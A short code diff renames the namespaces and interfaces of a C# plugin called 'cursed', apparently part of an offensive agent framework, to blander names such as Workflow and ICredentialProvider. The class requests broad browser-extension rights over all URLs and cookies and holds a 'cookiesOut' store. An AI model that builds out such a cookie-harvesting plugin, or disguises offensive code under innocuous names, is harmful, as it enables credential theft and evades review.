@@ -1,17 +1,17 @@
-﻿using Agent.Interfaces;
+using Workflow.Contracts;
 using System.Text.Json;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Models;
+using Workflow.Utilities;
 using System.Reflection;
 using cursed.Finders;
 
-namespace Agent
+namespace Workflow
 {
-    public partial class Plugin : IInteractivePlugin, IFilePlugin
+    public partial class Plugin : IInteractiveModule, IFileModule
     {
         public string Name => "cursed";
-        private IMessageManager messageManager { get; set; }
-        private ISpawner spawner { get; set; }
+        private IDataBroker messageManager { get; set; }
+        private IRuntimeExecutor spawner { get; set; }
         private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking", "cookies", "storage", "declarativeNetRequest" };
         private readonly List<string> main_v3_permissions = new List<string> { "webRequest", "cookies", "storage", "declarativeNetRequest" };
         private readonly List<string> main_v3_host_permissions = new List<string> { "<all_urls>" };
@@ -19,7 +19,7 @@ namespace Agent
         private Dictionary<string, string> cookiesOut = new Dictionary<string, string>();
         private CursedConfig config { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.config = new CursedConfig();
             this.messageManager = messageManager;
